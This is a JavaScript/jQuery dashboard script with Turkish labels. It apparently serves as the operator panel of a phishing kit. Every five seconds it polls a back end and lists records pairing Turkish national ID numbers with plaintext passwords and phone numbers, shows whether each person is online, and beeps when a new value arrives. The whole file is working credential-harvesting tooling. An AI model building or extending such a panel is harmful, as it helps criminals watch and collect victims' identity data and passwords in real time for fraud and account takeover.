$(document).ready(function() {
    let currentPage = 1;
    const limit = 7;
    let userIdToDelete = null;
    let dropdownStates = {};
    let previousData = {};

    function playBeep() {
        let audio = new Audio('https://dm0qx8t0i9gc9.cloudfront.net/watermarks/audio/BsTwCwBHBjzwub4i4/audioblocks-bells-positive-sound_BKqfVgMUAvU_WM.mp3');
        audio.play();
    }

    function updateStatus() {
        fetch('post/update_status.php')
            .then(response => response.json())
            .then(data => {
                console.log('Status updated:', data);
            })
            .catch(error => console.error('Error updating status:', error));
    }

    function fetchUsers(page = 1) {
        $.ajax({
            url: 'post/fetch.php',
            type: 'GET',
            data: { page: page, orderBy: 'id', orderDir: 'desc' },
            dataType: 'json',
            success: function(response) {
                console.log('Fetch Response:', response); 
                let tbody = $('#userTable tbody');
                let totalEntries = response.total;
                let data = response.data;
                let start = (page - 1) * limit + 1;
                let end = Math.min(page * limit, totalEntries);

                $('tr[data-id]').each(function() {
                    let id = $(this).data('id');
                    dropdownStates[id] = $(this).find('.dropdown-menu').is(':visible');
                });

                tbody.empty();

                if (data.length > 0) {
                    data.forEach(user => {
                        let statusIcon = user.is_online === 'Online' ? 
                            `<svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="lightgreen" class="bi bi-wifi" viewBox="0 0 16 16">
                                <path d="M15.384 6.115a.485.485 0 0 0-.047-.736A12.44 12.44 0 0 0 8 3C5.259 3 2.723 3.882.663 5.379a.485.485 0 0 0-.048.736.52.52 0 0 0 .668.05A11.45 11.45 0 0 1 8 4c2.507 0 4.827.802 6.716 2.164.205.148.49.13.668-.049"/>
                                <path d="M13.229 8.271a.482.482 0 0 0-.063-.745A9.46 9.46 0 0 0 8 6c-1.905 0-3.68.56-5.166 1.526a.48.48 0 0 0-.063.745.525.525 0 0 0 .652.065A8.46 8.46 0 0 1 8 7a8.46 8.46 0 0 1 4.576 1.336c.206.132.48.108.653-.065m-2.183 2.183c.226-.226.185-.605-.1-.75A6.5 6.5 0 0 0 8 9c-1.06 0-2.062.254-2.946.704-.285.145-.326.524-.1.75l.015.015c.16.16.407.19.611.09A5.5 5.5 0 0 1 8 10c.868 0 1.69.201 2.42.56.203.1.45.07.61-.091zM9.06 12.44c.196-.196.198-.52-.04-.66A2 2 0 0 0 8 11.5a2 2 0 0 0-1.02.28c-.238.14-.236.464-.04.66l.706.706a.5.5 0 0 0 .707 0l.707-.707z"/>
                            </svg>` : 
                            `<svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="red" class="bi bi-wifi-off" viewBox="0 0 16 16">
                                <path d="M10.706 3.294A12.6 12.6 0 0 0 8 3C5.259 3 2.723 3.882.663 5.379a.485.485 0 0 0-.048.736.52.52 0 0 0 .668.05A11.45 11.45 0 0 1 8 4q.946 0 1.852.148zM8 6c-1.905 0-3.68.56-5.166 1.526a.48.48 0 0 0-.063.745.525.525 0 0 0 .652.065 8.45 8.45 0 0 1 3.51-1.27zm2.596 1.404.785-.785q.947.362 1.785.907a.482.482 0 0 1 .063.745.525.525 0 0 1-.652.065 8.5 8.5 0 0 0-1.98-.932zM8 10l.933-.933a6.5 6.5 0 0 1 2.013.637c.285.145.326.524.1.75l-.015.015a.53.53 0 0 1-.611.09A5.5 5.5 0 0 0 8 10m4.905-4.905.747-.747q.886.451 1.685 1.03a.485.485 0 0 1 .047.737.52.52 0 0 1-.668.05 11.5 11.5 0 0 0-1.811-1.07M9.02 11.78c.238.14.236.464.04.66l-.707.706a.5.5 0 0 1-.707 0l-.707-.707c-.195-.195-.197-.518.04-.66A2 2 0 0 1 8 11.5c.374 0 .723.102 1.021.28zm4.355-9.905a.53.53 0 0 1 .75.75l-10.75 10.75a.53.53 0 0 1-.75-.75z"/>
                            </svg>`;

                        let tcknNotification = '';
                        let passwordNotification = '';
                        let phoneNotification = '';

                        if (previousData[user.id]) {
                            if (previousData[user.id].txtTCKN !== user.txtTCKN) {
                                playBeep();
                                tcknNotification = `<svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="green" class="bi bi-check-circle-fill" viewBox="0 0 16 16">
                                    <path d="M16 8a8 8 0 1 1-16 0 8 8 0 0 1 16 0zM6.93 9.93l-2.45-2.45a.75.75 0 0 0-1.06 1.06l3 3a.75.75 0 0 0 1.06 0l6-6a.75.75 0 0 0-1.06-1.06l-5.47 5.47z"/>
                                </svg>`;
                            }
                            if (previousData[user.id].txtPassword !== user.txtPassword) {
                                playBeep();
                                passwordNotification = `<svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="green" class="bi bi-check-circle-fill" viewBox="0 0 16 16">
                                    <path d="M16 8a8 8 0 1 1-16 0 8 8 0 0 1 16 0zM6.93 9.93l-2.45-2.45a.75.75 0 0 0-1.06 1.06l3 3a.75.75 0 0 0 1.06 0l6-6a.75.75 0 0 0-1.06-1.06l-5.47 5.47z"/>
                                </svg>`;
                            }
                            if (previousData[user.id].txtPhone !== user.txtPhone) {
                                playBeep();
                                phoneNotification = `<svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="green" class="bi bi-check-circle-fill" viewBox="0 0 16 16">
                                    <path d="M16 8a8 8 0 1 1-16 0 8 8 0 0 1 16 0zM6.93 9.93l-2.45-2.45a.75.75 0 0 0-1.06 1.06l3 3a.75.75 0 0 0 1.06 0l6-6a.75.75 0 0 0-1.06-1.06l-5.47 5.47z"/>
                                </svg>`;
                            }
                        }

                        previousData[user.id] = {
                            txtTCKN: user.txtTCKN,
                            txtPassword: user.txtPassword,
                            txtPhone: user.txtPhone,
                            is_online: user.is_online
                        };

                        tbody.append(
                            `<tr data-id="${user.id}">
                                <td class="text-center">${user.id}</td>
                                <td>${statusIcon}</td>
                                <td>${user.txtTCKN}${tcknNotification}</td>
                                <td>${user.txtPassword}${passwordNotification}</td>
                                <td>${user.txtPhone}${phoneNotification}</td> 
                                <td>
                                    <form action="post.php" method="post">
                                        <div class="d-inline-block">
                                            <a href="javascript:;" class="btn btn-sm btn-text-secondary rounded-pill btn-icon dropdown-toggle hide-arrow" data-bs-toggle="dropdown">
                                                <i class="ti ti-pencil ti-md"></i>
                                            </a>
                                            <input type="hidden" name="id" value="${user.id}">
                                            <ul class="dropdown-menu dropdown-menu-end m-0">
                                                <div class="dropdown-divider"></div>
                                                <li>
                                                    <a href="javascript:;" class="dropdown-item text-danger delete-record" data-id="${user.id}">Sil</a>
                                                </li>
                                            </ul>
                                        </div>
                                    </form>
                                </td>
                            </tr>`
                        );
                    });
                } else {
                    tbody.append('<tr><td colspan="7" class="text-center">Hiçbir veri bulunamadı</td></tr>');
                }

                $('tr[data-id]').each(function() {
                    let id = $(this).data('id');
                    if (dropdownStates[id]) {
                        $(this).find('.dropdown-toggle').dropdown('toggle');
                    }
                });

                $('#currentEntries').text(start);
                $('#currentEntriesEnd').text(end);
                $('#totalEntries').text(totalEntries);

                let totalPages = Math.ceil(totalEntries / limit);
                let paginationHTML = '';

                for (let i = 1; i <= totalPages; i++) {
                    paginationHTML += 
                        `<li class="paginate_button page-item ${i === page ? 'active' : ''}">
                            <a href="javascript:void(0);" aria-controls="DataTables_Table_0" role="link" data-dt-idx="${i}" tabindex="0" class="page-link">${i}</a>
                        </li>`;
                }

                $('#pagination').html(paginationHTML);

                $('#pagination .page-link').off('click').on('click', function() {
                    let pageIndex = $(this).data('dt-idx');
                    fetchUsers(pageIndex);
                });

                $('.delete-record').off('click').on('click', function() {
                    userIdToDelete = $(this).data('id');
                    $('#deleteModal').modal('show');
                });

                $('#confirmDelete').off('click').on('click', function() {
                    if (userIdToDelete !== null) {
                        $.ajax({
                            url: 'post/delete.php',
                            type: 'POST',
                            data: { id: userIdToDelete },
                            dataType: 'json',
                            success: function(response) {
                                if (response.status === 'success') {
                                    fetchUsers(currentPage);
                                    $('#deleteModal').modal('hide');
                                    userIdToDelete = null;
                                } else {
                                    alert('Silme işlemi sırasında hata oluştu: ' + response.message);
                                }
                            },
                            error: function(error) {
                                console.error('Silme hatası:', error);
                            }
                        });
                    }
                });


                let now = new Date();
                let formattedTime = String(now.getHours()).padStart(2, '0') + ':' + 
                                    String(now.getMinutes()).padStart(2, '0') + ':' + 
                                    String(now.getSeconds()).padStart(2, '0');
                $('#lastUpdateTime').text(formattedTime);

            },
            error: function(error) {
                console.error('Veri çekme hatası:', error);
            }
        });
    }

    fetchUsers(); 

    setInterval(function() {
        updateStatus();
        fetchUsers(currentPage);
    }, 5000);
});
